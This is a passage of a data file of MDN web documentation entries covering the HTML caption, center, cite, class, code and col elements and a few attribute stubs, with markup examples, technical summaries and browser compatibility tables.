[`HTMLTableCaptionElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTableCaptionElement)                                      |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `caption` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<col>`](col), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`caption-side`](https://developer.mozilla.org/en-US/docs/Web/CSS/caption-side): CSS property to position the `<caption>` relative to its parent [`<table>`](table)\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align the text content of the `<caption>`\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/caption](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/caption)"
- name: capture (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`capture`](attributes/capture)

    [`<input>`](element/input)

    From the [Media Capture specification](https://w3c.github.io/html-media-capture/#the-capture-attribute), specifies a new file can be captured.
- name: center
  summary: 'Deprecated: This feature is no longer recommended'
  description: "# \\<center\\>: The Centered Text element\n\n**Deprecated:** This feature is no longer recommended. Though some browsers might still support it, it may have already been removed from the relevant web standards, may be in the process of being dropped, or may only be kept for compatibility purposes. Avoid using it, and update existing code if possible; see the [compatibility table](#browser_compatibility) at the bottom of this page to guide your decision. Be aware that this feature may cease to work at any time.\n\nThe `<center>` [HTML](../index) element is a [block-level element](https://developer.mozilla.org/en-US/docs/Glossary/Block-level_content) that displays its block-level or inline contents centered horizontally within its containing element. The container is usually, but isn't required to be, [`<body>`](body).\n\nThis tag has been deprecated in HTML 4 (and XHTML 1) in favor of the [CSS](https://developer.mozilla.org/en-US/docs/Web/CSS) [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) property, which can be applied to the [`<div>`](div) element or to an individual [`<p>`](p). For centering blocks, use other CSS properties like [`margin-left`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-left) and [`margin-right`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin-right) and set them to `auto` (or set [`margin`](https://developer.mozilla.org/en-US/docs/Web/CSS/margin) to `0 auto`).\n\n## DOM interface\n\nThis element implements the [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) interface.\n\n## Example 1\n\nhtml\n\n```\n<center>\n  This text will be centered.\n  <p>So will this paragraph.</p>\n</center>\n```\n\n### Result\n\n## Example 2 (CSS alternative)\n\nhtml\n\n```\n<div style=\"text-align:center\">\n  This text will be centered.\n  <p>So will this paragraph.</p>\n</div>\n```\n\n### Result\n\n## Example 3 (CSS alternative)\n\nhtml\n\n```\n<p style=\"text-align:center\">\n  This line will be centered.<br />\n  And so will this line.\n</p>\n```\n\n### Result\n\n**Note:** Applying [`text-align: center`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) to a [`<div>`](div) or [`<p>`](p) element centers the *contents* of those elements while leaving their overall dimensions unchanged.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n[TABLE]\n\n## See also\n\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align)\n- [`display`](https://developer.mozilla.org/en-US/docs/Web/CSS/display)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/center](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/center)"
- name: charset (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`charset`](element/meta#charset)

    [`<meta>`](element/meta)

    Declares the character encoding of the page or script.
- name: checked (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`checked`](element/input#checked)

    [`<input>`](element/input)

    Indicates whether the element should be checked on page load.
- name: cite
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<cite\\>: The Citation element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcite&level=high)\n\nThe `<cite>` [HTML](../index) element is used to mark up the title of a cited creative work. The reference may be in an abbreviated form according to context-appropriate conventions related to citation metadata.\n\n## Try it\n\n#### HTML Demo: \\<cite\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <figure>\n      <blockquote>\n        <p>It was a bright cold day in April, and the clocks were striking thirteen.</p>\n      </blockquote>\n      <figcaption>\n        First sentence in <cite><a href=\"http://www.george-orwell.org/1984/0.html\">Nineteen Eighty-Four</a></cite> by George\n        Orwell (Part 1, Chapter 1).\n      </figcaption>\n    </figure>\n\n    /* stylelint-disable-next-line block-no-empty */\n    cite {\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Usage notes\n\nIn the context of the `<cite>` element, a creative work that might be cited could be, for example, one of the following:\n\n- A book\n- A research paper\n- An essay\n- A poem\n- A musical score\n- A song\n- A play or film script\n- A film\n- A television show\n- A game\n- A sculpture\n- A painting\n- A theatrical production\n- A play\n- An opera\n- A musical\n- An exhibition\n- A legal case report\n- A computer program\n- A website\n- A web page\n- A blog post or comment\n- A forum post or comment\n- A tweet\n- A Facebook post\n- A written or oral statement\n- And so forth.\n\nTo include a reference to the source of quoted material which is contained within a [`<blockquote>`](blockquote) or [`<q>`](q) element, use the [`cite`](blockquote#cite) attribute on the element.\n\nTypically, browsers style the contents of a `<cite>` element in italics by default. To avoid this, apply the CSS [`font-style`](https://developer.mozilla.org/en-US/docs/Web/CSS/font-style) property to the `<cite>` element.\n\n## Examples\n\nhtml\n\n```\n<p>More information can be found in <cite>[ISO-0000]</cite>.</p>\n```\n\n### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.                                                                                                                               |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                            |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                                                                                             |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) Up to Gecko 1.9.2 (Firefox 4) inclusive, Firefox implements the [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement) interface for this element. |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `cite` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- The element [`<blockquote>`](blockquote) for long quotations.\n- The element [`<q>`](q) for inline quotations and the [`cite`](q#cite) attribute.\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/cite](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/cite)"
- name: cite (attribute)
  summary: ''
  belongs_to: Attributes
  description: |-
    [`cite`](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/cite)

    [`<blockquote>`](element/blockquote), [`<del>`](element/del), [`<ins>`](element/ins), [`<q>`](element/q)

    Contains a URI which points to the source of the quote or change.
- name: class (attribute)
  summary: The class global attribute is a list of the classes of the element, separated by ASCII whitespace
  description: "# class\n\nThe `class` [global attribute](../global_attributes) is a list of the classes of the element, separated by [ASCII whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace#in_html).\n\n## Try it\n\n#### HTML Demo: class\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>Narrator: This is the beginning of the play.</p>\n\n    <p class=\"note editorial\">Above point sounds a bit obvious. Remove/rewrite?</p>\n\n    <p>Narrator: I must warn you now folks that this beginning is very exciting.</p>\n\n    <p class=\"note\">[Lights go up and wind blows; Caspian enters stage right]</p>\n\n    .note {\n      font-style: italic;\n      font-weight: bold;\n    }\n\n    .editorial {\n      background: rgb(255, 0, 0, 0.25);\n      padding: 10px;\n    }\n\n    .editorial:before {\n      content: 'Editor: ';\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Description\n\nClasses allow CSS and JavaScript to select and access specific elements via the [class selectors](https://developer.mozilla.org/en-US/docs/Web/CSS/Class_selectors) or functions like the [`document.getElementsByClassName()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/getElementsByClassName).\n\nThough the specification doesn't put requirements on the name of classes, web developers are encouraged to use names that describe the semantic purpose of the element, rather than the presentation of the element. For example, *attribute* to describe an attribute rather than *italics*, although an element of this class may be presented by *italics*. Semantic names remain logical even if the presentation of the page changes.\n\n### Syntax\n\nThe `class` attribute is a list of class values separated by [ASCII whitespace](https://developer.mozilla.org/en-US/docs/Glossary/Whitespace#in_html).\n\nEach class value may contain any Unicode characters (except, of course, ASCII whitespace). However, when used in CSS selectors, either from JavaScript using APIs like [`Document.querySelector()`](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelector) or in CSS stylesheets, class attribute values must be valid [CSS identifiers](https://developer.mozilla.org/en-US/docs/Web/CSS/ident). This means that if a class attribute value is not a valid CSS identifier (for example, `my?class` or `1234`) then it must be escaped before being used in a selector, either using the [`CSS.escape()`](https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape_static) method or [manually](https://developer.mozilla.org/en-US/docs/Web/CSS/ident#escaping_characters).\n\nFor this reason, it's recommended that developers choose values for class attributes that are valid CSS identifiers that don't require escaping.\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|         | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|---------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|         | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `class` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- All [global attributes](../global_attributes).\n- [`element.className`](https://developer.mozilla.org/en-US/docs/Web/API/Element/className)\n- [`element.classList`](https://developer.mozilla.org/en-US/docs/Web/API/Element/classList)\n- [Introduction to CSS](https://developer.mozilla.org/en-US/docs/Learn/CSS)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/class](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/class)"
- name: code
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<code\\>: The Inline Code element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcode&level=high)\n\nThe `<code>` [HTML](../index) element displays its contents styled in a fashion intended to indicate that the text is a short fragment of computer code. By default, the content text is displayed using the [user agent's](https://developer.mozilla.org/en-US/docs/Glossary/User_agent) default monospace font.\n\n## Try it\n\n#### HTML Demo: \\<code\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <p>\n      The <code>push()</code> method adds one or more elements to the end of an array and returns the new length of the\n      array.\n    </p>\n\n    code {\n      background-color: #eee;\n      border-radius: 3px;\n      font-family: courier, monospace;\n      padding: 0 3px;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element only includes the [global attributes](../global_attributes).\n\n## Examples\n\nA paragraph of text that includes `<code>`:\n\nhtml\n\n```\n<p>\n  The function <code>selectAll()</code> highlights all the text in the input\n  field so the user can, for example, copy or delete the text.\n</p>\n```\n\n### Result\n\n## Notes\n\nTo represent multiple lines of code, wrap the `<code>` element within a [`<pre>`](pre) element. The `<code>` element by itself only represents a single phrase of code or line of code.\n\nA CSS rule can be defined for the `code` selector to override the browser's default font face. Preferences set by the user might take precedence over the specified CSS.\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                                                                                                 |\n|---------------------------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | [Flow content](../content_categories#flow_content), [phrasing content](../content_categories#phrasing_content), palpable content.                                                                                                                               |\n| Permitted content                           | [Phrasing content](../content_categories#phrasing_content).                                                                                                                                                                                                     |\n| Tag omission                                | None, both the starting and ending tag are mandatory.                                                                                                                                                                                                           |\n| Permitted parents                           | Any element that accepts [phrasing content](../content_categories#phrasing_content).                                                                                                                                                                            |\n| Implicit ARIA role                          | [`code`](https://developer.mozilla.org/en-US/docs/Web/Accessibility/ARIA/Roles/structural_roles#structural_roles_with_html_equivalents)                                                                                                                         |\n| Permitted ARIA roles                        | Any                                                                                                                                                                                                                                                             |\n| DOM interface                               | [`HTMLElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLElement) Up to Gecko 1.9.2 (Firefox 4) inclusive, Firefox implements the [`HTMLSpanElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLSpanElement) interface for this element. |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|        | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|--------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|        | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `code` | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [`<samp>`](samp)\n- [`<kbd>`](kbd)\n- [`<var>`](var)\n- [`<pre>`](pre)\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/code](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/code)"
- name: col
  summary: This feature is well established and works across many devices and browser versions
  description: "# \\<col\\>: The Table Column element\n\n## Baseline Widely available\n\nThis feature is well established and works across many devices and browser versions. It’s been available across browsers since July 2015.\n\n- [Learn more](https://developer.mozilla.org/en-US/docs/Glossary/Baseline/Compatibility)\n- [See full compatibility](#browser_compatibility)\n- [Report feedback](https://survey.alchemer.com/s3/7634825/MDN-baseline-feedback?page=%2Fen-US%2Fdocs%2FWeb%2FHTML%2FElement%2Fcol&level=high)\n\nThe `<col>` [HTML](../index) element defines one or more columns in a column group represented by its parent [`<colgroup>`](colgroup) element. The `<col>` element is only valid as a child of a [`<colgroup>`](colgroup) element that has no [`span`](colgroup#span) attribute defined.\n\n## Try it\n\n#### HTML Demo: \\<col\\>\n\nReset\n\nThe interactive example cannot be shown because JavaScript is disabled.\n\nThe interactive example cannot be shown because MathML is not supported by your browser.\n\nHTML\n\nCSS\n\nJavaScript\n\n    <table>\n      <caption>\n        Superheros and sidekicks\n      </caption>\n      <colgroup>\n        <col />\n        <col span=\"2\" class=\"batman\" />\n        <col span=\"2\" class=\"flash\" />\n      </colgroup>\n      <tr>\n        <td></td>\n        <th scope=\"col\">Batman</th>\n        <th scope=\"col\">Robin</th>\n        <th scope=\"col\">The Flash</th>\n        <th scope=\"col\">Kid Flash</th>\n      </tr>\n      <tr>\n        <th scope=\"row\">Skill</th>\n        <td>Smarts, strong</td>\n        <td>Dex, acrobat</td>\n        <td>Super speed</td>\n        <td>Super speed</td>\n      </tr>\n    </table>\n\n    .batman {\n      background-color: #d7d9f2;\n    }\n\n    .flash {\n      background-color: #ffe8d4;\n    }\n\n    table {\n      border-collapse: collapse;\n      border: 2px solid rgb(140 140 140);\n      font-family: sans-serif;\n      font-size: 0.8rem;\n      letter-spacing: 1px;\n    }\n\n    caption {\n      caption-side: bottom;\n      padding: 10px;\n    }\n\n    th,\n    td {\n      border: 1px solid rgb(160 160 160);\n      padding: 8px 6px;\n    }\n\n    td {\n      text-align: center;\n    }\n\n#### Output\n\n#### Console Output\n\nclear console\n\n%html-content%\n\n## Attributes\n\nThis element includes the [global attributes](../global_attributes).\n\n[`span`](#span)  \nSpecifies the number of consecutive columns the `<col>` element spans. The value must be a positive integer greater than zero. If not present, its default value is `1`.\n\n### Deprecated attributes\n\nThe following attributes are deprecated and should not be used. They are documented below for reference when updating existing code and for historical interest only.\n\n[`align`](#align) Deprecated  \nSpecifies the horizontal alignment of each column cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `left`, `center`, `right`, `justify`, and `char`. When supported, the `char` value aligns the textual content on the character defined in the [`char`](#char) attribute and on offset defined by the [`charoff`](#charoff) attribute. Note that this attribute overrides the specified [`align`](colgroup#align) of its [`<colgroup>`](colgroup) parent element. Use the [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align) CSS property on the [`<td>`](td) and [`<th>`](th) elements instead, as this attribute is deprecated.\n\n**Note:** Setting `text-align` on the `<col>` element has no effect as `<col>` has no descendants, and therefore no elements inherit from it.\n\nIf the table does not use a [`colspan`](td#colspan) attribute, use the `td:nth-of-type(an+b)` CSS selector. Set `a` to zero and `b` to the position of the column in the table, e.g. `td:nth-of-type(2) { text-align: right; }` to right-align the second column cells.\n\nIf the table does use a [`colspan`](td#colspan) attribute, the effect can be achieved by combining adequate CSS attribute selectors like `[colspan=n]`, though this is not trivial.\n\n[`bgcolor`](#bgcolor) Deprecated  \nDefines the background color of each column cell. The value is an HTML color; either a [6-digit hexadecimal RGB code](https://developer.mozilla.org/en-US/docs/Web/CSS/hex-color), prefixed by a '`#`', or a [color keyword](https://developer.mozilla.org/en-US/docs/Web/CSS/named-color). Other CSS [`<color>`](https://developer.mozilla.org/en-US/docs/Web/CSS/color_value) values are not supported. Use the [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color) CSS property instead, as this attribute is deprecated.\n\n[`char`](#char) Deprecated  \nDoes nothing. It was originally intended to specify the alignment of the content to a character of each column cell. Typical values for this include a period (`.`) when attempting to align numbers or monetary values. If [`align`](#align) is not set to `char`, this attribute is ignored, though it will still override the specified [`char`](colgroup#char) of its [`<colgroup>`](colgroup) parent element.\n\n[`charoff`](#charoff) Deprecated  \nDoes nothing. It was originally intended to specify the number of characters to offset the column cell content from the alignment character specified by the [`char`](#char) attribute.\n\n[`valign`](#valign) Deprecated  \nSpecifies the vertical alignment of each column cell. The possible [enumerated](https://developer.mozilla.org/en-US/docs/Glossary/Enumerated) values are `baseline`, `bottom`, `middle`, and `top`. Note that this attribute overrides the specified [`valign`](colgroup#valign) of its [`<colgroup>`](colgroup) parent element. Use the [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align) CSS property on the [`<td>`](td) and [`<th>`](th) elements instead, as this attribute is deprecated.\n\n**Note:** Setting `vertical-align` on the `<col>` element has no effect as `<col>` has no descendants, and therefore no elements inherit from it.\n\nIf the table does not use a [`colspan`](td#colspan) attribute, use the `td:nth-of-type(an+b)` CSS selector. Set `a` to zero and `b` to the position of the column in the table, e.g. `td:nth-of-type(2) { vertical-align: middle; }` to center the second column cells vertically.\n\nIf the table does use a [`colspan`](td#colspan) attribute, the effect can be achieved by combining adequate CSS attribute selectors like `[colspan=n]`, though this is not trivial.\n\n[`width`](#width) Deprecated  \nSpecifies a default width for each column. In addition to the standard pixel and percentage values, this attribute can take the special form `0*`, which means that the width of each column spanned should be the minimum width necessary to hold the column's contents. Relative widths such as `5*` can also be used. Note that this attribute overrides the specified [`width`](colgroup#width) of its [`<colgroup>`](colgroup) parent element. Use the [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width) CSS property instead, as this attribute is deprecated.\n\n## Usage notes\n\n- The `<col>` element is used within a [`<colgroup>`](colgroup) element that doesn't have a `span` attribute.\n- The `<col>` elements do not structurally group columns together. This is the role of the [`<colgroup>`](colgroup) element.\n- Only a limited number of CSS properties affect `<col>`:\n  - [`background`](https://developer.mozilla.org/en-US/docs/Web/CSS/background) : The various `background` properties will set the background for cells within the column. As the column background color is painted on top of the table and column groups ([`<colgroup>`](colgroup)), but behind background colors applied to the row groups ([`<thead>`](thead), [`<tbody>`](tbody), and [`<tfoot>`](tfoot)), the rows ([`<tr>`](tr)), and the individual cells ([`<th>`](th) and [`<td>`](td)), backgrounds applied to table columns are only visible if every layer painted on top of them has a transparent background.\n  - [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): The various `border` properties apply, but only if the `<table>` has [`border-collapse: collapse`](https://developer.mozilla.org/en-US/docs/Web/CSS/border-collapse) set.\n  - [`visibility`](https://developer.mozilla.org/en-US/docs/Web/CSS/visibility): The value `collapse` for a column results in all cells of that column not being rendered, and cells spanning into other columns being clipped. The space these columns would have occupied is removed. However, the size of other columns is still calculated as though the cells in the collapsed column(s) are present. Other values for `visibility` have no effect.\n  - [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): The `width` property defines a minimum width for the column, as if [`min-width`](https://developer.mozilla.org/en-US/docs/Web/CSS/min-width) were set.\n\n## Example\n\nSee [`<table>`](table) for a complete table example introducing common standards and best practices.\n\nThis example demonstrates an eight-column table divided into three `<col>` elements.\n\n### HTML\n\nA [`<colgroup>`](colgroup) element provides structures to a basic table, creating a single implicit column group. Three `<col>` elements are included within the `<colgroup>`, creating three stylable columns. The [`span`](#span) attribute specifies the number of table columns each `<col>` should span (defaulting to `1` when omitted), enabling attributes to be shared across the columns in each `<col>`.\n\nhtml\n\n```\n<table>\n  <caption>\n    Personal weekly activities\n  </caption>\n  <colgroup>\n    <col />\n    <col span=\"5\" class=\"weekdays\" />\n    <col span=\"2\" class=\"weekend\" />\n  </colgroup>\n  <tr>\n    <th>Period</th>\n    <th>Mon</th>\n    <th>Tue</th>\n    <th>Wed</th>\n    <th>Thu</th>\n    <th>Fri</th>\n    <th>Sat</th>\n    <th>Sun</th>\n  </tr>\n  <tr>\n    <th>a.m.</th>\n    <td>Clean room</td>\n    <td>Football training</td>\n    <td>Dance Course</td>\n    <td>History Class</td>\n    <td>Buy drinks</td>\n    <td>Study hour</td>\n    <td>Free time</td>\n  </tr>\n  <tr>\n    <th>p.m.</th>\n    <td>Yoga</td>\n    <td>Chess Club</td>\n    <td>Meet friends</td>\n    <td>Gymnastics</td>\n    <td>Birthday party</td>\n    <td>Fishing trip</td>\n    <td>Free time</td>\n  </tr>\n</table>\n```\n\n### CSS\n\nWe use CSS, instead of deprecated HTML attributes, to provide a background color to the columns and align the cell content:\n\ncss\n\n```\ntable {\n  border-collapse: collapse;\n  border: 2px solid rgb(140 140 140);\n}\n\ncaption {\n  caption-side: bottom;\n  padding: 10px;\n}\n\nth,\ntd {\n  border: 1px solid rgb(160 160 160);\n  padding: 8px 6px;\n  text-align: center;\n}\n\n.weekdays {\n  background-color: #d7d9f2;\n}\n\n.weekend {\n  background-color: #ffe8d4;\n}\n```\n\n#### Result\n\n## Technical summary\n\n|                                             |                                                                                                                                                                                       |\n|---------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|\n| [Content categories](../content_categories) | None.                                                                                                                                                                                 |\n| Permitted content                           | None; it is a [void element](https://developer.mozilla.org/en-US/docs/Glossary/Void_element).                                                                                         |\n| Tag omission                                | Must have a start tag and must not have an end tag.                                                                                                                                   |\n| Permitted parents                           | [`<colgroup>`](colgroup) only, though it can be implicitly defined as its start tag is not mandatory. The [`<colgroup>`](colgroup) must not have a [`span`](colgroup#span) attribute. |\n| Implicit ARIA role                          | [No corresponding role](https://www.w3.org/TR/html-aria/#dfn-no-corresponding-role)                                                                                                   |\n| Permitted ARIA roles                        | No `role` permitted                                                                                                                                                                   |\n| DOM interface                               | [`HTMLTableColElement`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLTableColElement)                                                                                         |\n\n## Specifications\n\n[TABLE]\n\n## Browser compatibility\n\n|           | Desktop |      |         |       |        |                | Mobile              |               |               |                  |                 |     |\n|-----------|---------|------|---------|-------|--------|----------------|---------------------|---------------|---------------|------------------|-----------------|-----|\n|           | Chrome  | Edge | Firefox | Opera | Safari | Chrome Android | Firefox for Android | Opera Android | Safari on IOS | Samsung Internet | WebView Android |     |\n| `col`     | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `align`   | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `char`    | 1       | 12   | No      | 15    | 3      | 18             | No                  | 14            | 2             | 1.0              | 4.4             |     |\n| `charoff` | 1       | 12   | No      | 15    | 3      | 18             | No                  | 14            | 2             | 1.0              | 4.4             |     |\n| `span`    | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n| `valign`  | 1       | 12   | 1       | 15    | 3      | 18             | 4                   | 14            | 2             | 1.0              | 4.4             |     |\n| `width`   | 1       | 12   | 1       | 15    | ≤4     | 18             | 4                   | 14            | ≤3.2          | 1.0              | 4.4             |     |\n\n## See also\n\n- [Learn: HTML tables](https://developer.mozilla.org/en-US/docs/Learn/HTML/Tables)\n- [`<caption>`](caption), [`<colgroup>`](colgroup), [`<table>`](table), [`<tbody>`](tbody), [`<td>`](td), [`<tfoot>`](tfoot), [`<th>`](th), [`<thead>`](thead), [`<tr>`](tr): Other table-related elements\n- [`background-color`](https://developer.mozilla.org/en-US/docs/Web/CSS/background-color): CSS property to set the background color of each column cell\n- [`border`](https://developer.mozilla.org/en-US/docs/Web/CSS/border): CSS property to control borders of column cells\n- [`text-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/text-align): CSS property to horizontally align each column cell content\n- [`vertical-align`](https://developer.mozilla.org/en-US/docs/Web/CSS/vertical-align): CSS property to vertically align each column cell content\n- [`visibility`](https://developer.mozilla.org/en-US/docs/Web/CSS/visibility): CSS property to hide cells of a column\n- [`width`](https://developer.mozilla.org/en-US/docs/Web/CSS/width): CSS property to control the default width for each column\n- [`:nth-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:nth-of-type), [`:first-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:first-of-type), [`:last-of-type`](https://developer.mozilla.org/en-US/docs/Web/CSS/:last-of-type): CSS pseudo-classes to select the desired column cells\n\n© 2005–2023 MDN contributors.  \nLicensed under the Creative Commons Attribution-ShareAlike License v2.5 or later.  \n[https://developer.mozilla.org/en-US/docs/Web/HTML/Element/col](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/col)"
- name: colgroup
  summary: This feature is well established and works across many devices and browser versions
